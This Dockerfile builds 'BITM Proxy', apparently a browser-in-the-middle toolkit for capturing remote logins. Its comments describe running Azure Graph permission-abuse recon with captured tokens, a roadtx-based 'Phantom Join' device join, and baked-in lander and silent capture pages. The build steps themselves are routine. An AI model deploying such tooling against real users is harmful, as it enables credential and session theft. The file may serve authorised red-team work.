# ── Stage 1: Build frontend ──
FROM node:20-alpine AS frontend-build
WORKDIR /build
COPY frontend/package.json frontend/package-lock.json* ./
RUN npm install --no-audit --no-fund
COPY frontend/ ./
RUN npm run build

# ── Stage 2: Python runtime ──
FROM python:3.12-slim
LABEL maintainer="bitm-proxy"
LABEL description="BITM Proxy — Remote browser login for any site"

WORKDIR /app

# Install ca-certificates so we can add custom certs (Zscaler, etc)
RUN apt-get update && apt-get install -y --no-install-recommends ca-certificates && rm -rf /var/lib/apt/lists/*

# Copy custom CA certs from the repo's certs/ dir and install them at build time
COPY certs/ /certs/
RUN if ls /certs/*.crt /certs/*.pem 2>/dev/null; then \
        cp /certs/*.crt /usr/local/share/ca-certificates/ 2>/dev/null || true; \
        for f in /certs/*.pem; do \
            [ -f "$f" ] && cp "$f" "/usr/local/share/ca-certificates/$(basename "$f" .pem).crt"; \
        done; \
        update-ca-certificates; \
        echo "Custom CA certs installed at build time"; \
    else \
        echo "No certs found in certs/"; \
    fi

ENV SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt
ENV REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
ENV CURL_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
ENV NODE_EXTRA_CA_CERTS=/etc/ssl/certs/ca-certificates.crt

# ── PowerShell (pwsh) ──
# The AbuseAzureAPIPermissions ("AAA") runner (backend/aaa_runner.py) shells
# out to `pwsh` to dot-source tools/AbuseAzureAPIPermissions/AbuseAzureAPIPermissions.ps1
# and call its recon functions with a captured Graph token. Without pwsh on
# PATH the AAA tools in the dashboard sit disabled ("`pwsh` not found on PATH").
# Microsoft's apt repo ships no arm64 PowerShell package, so install from the
# GitHub release tarball, which provides both linux-x64 and linux-arm64 —
# keeping the image buildable on amd64 Linux and arm64 (Apple Silicon) alike.
# Placed before the (slow) Python/Playwright layer so a requirements.txt change
# doesn't re-pull pwsh and vice versa.
ARG PS_VERSION=7.4.6
RUN set -eux; \
    case "$(dpkg --print-architecture)" in \
        amd64) ps_arch=x64 ;; \
        arm64) ps_arch=arm64 ;; \
        *) echo "unsupported arch for PowerShell" >&2; exit 1 ;; \
    esac; \
    apt-get update; \
    apt-get install -y --no-install-recommends \
        curl libgssapi-krb5-2 libstdc++6 zlib1g libc6 libgcc-s1; \
    # ICU + OpenSSL package names differ across Debian releases (trixie:
    # libicu76 / libssl3t64; bookworm: libicu72 / libssl3) — pick whichever
    # the base image provides so this survives a base-image bump.
    (apt-get install -y --no-install-recommends libicu76 \
        || apt-get install -y --no-install-recommends libicu72); \
    (apt-get install -y --no-install-recommends libssl3t64 \
        || apt-get install -y --no-install-recommends libssl3); \
    curl -fsSL -o /tmp/powershell.tar.gz \
        "https://github.com/PowerShell/PowerShell/releases/download/v${PS_VERSION}/powershell-${PS_VERSION}-linux-${ps_arch}.tar.gz"; \
    mkdir -p /opt/microsoft/powershell/7; \
    tar zxf /tmp/powershell.tar.gz -C /opt/microsoft/powershell/7; \
    chmod +x /opt/microsoft/powershell/7/pwsh; \
    ln -sf /opt/microsoft/powershell/7/pwsh /usr/bin/pwsh; \
    rm -f /tmp/powershell.tar.gz; \
    rm -rf /var/lib/apt/lists/*; \
    pwsh --version
ENV POWERSHELL_TELEMETRY_OPTOUT=1

# Install Python deps + Playwright browsers (Chromium + Edge + Firefox).
# Edge has no arm64 Linux build at all (Microsoft has never shipped one —
# confirmed against a live arm64 build, not just docs) so it's best-effort
# and silently disables edge-real mode there. Firefox DOES have a real
# arm64 Linux build (also confirmed live) but needs GTK3 libs beyond what
# --with-deps chromium already installed — --with-deps here covers that.
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt \
    && playwright install --with-deps chromium \
    && (playwright install msedge || echo "msedge unavailable (likely arm64); edge-real mode disabled") \
    && playwright install --with-deps firefox

# Copy backend code
COPY backend/ ./backend/
COPY config/ ./config/

# tools/phantom_runner.py is spawned as `python -m tools.phantom_runner`
# by backend/routes/phantom.py (Phantom Join tab) — roadtx/roadrecon/roadlib
# are already pulled in via requirements.txt above, but the package itself
# still has to be in the image. Confirmed live: omitting this step doesn't
# fail the build, it fails at run time with "No module named 'tools'" the
# first time a Phantom Join run is triggered.
COPY tools/ ./tools/

# Burp extension, served by the Settings -> RAG Scan Stack -> Burp Suite
# download button (GET /api/rag/burp-extension/download in debug_server.py).
COPY burp-extension/ ./burp-extension/

# Copy built frontend into /app/static (where main.py expects it)
COPY --from=frontend-build /build/dist/ ./static/

# Demo capture pages, reachable via main.py's static catch-all route
# (/{path:path}) once dropped into static/ — same mechanism README.md
# documents for operator-hosted lander/silent pages, just baked into the
# image here instead of a manual per-deployment copy step.
COPY pages/silent.html pages/lander.html ./static/

# Data directory for JSON persistence
RUN mkdir -p /data /screenshots
VOLUME /data
VOLUME /screenshots

# Additional certs can still be mounted at runtime
ENV DATA_DIR=/data
ENV CERTS_DIR=/certs
ENV PYTHONUNBUFFERED=1
ENV HOST=0.0.0.0

EXPOSE 8091 8092 8000 3100-3199 8085

# Entrypoint picks up any runtime-mounted certs, then starts uvicorn
COPY entrypoint.sh /app/entrypoint.sh
RUN chmod +x /app/entrypoint.sh

CMD ["/app/entrypoint.sh"]
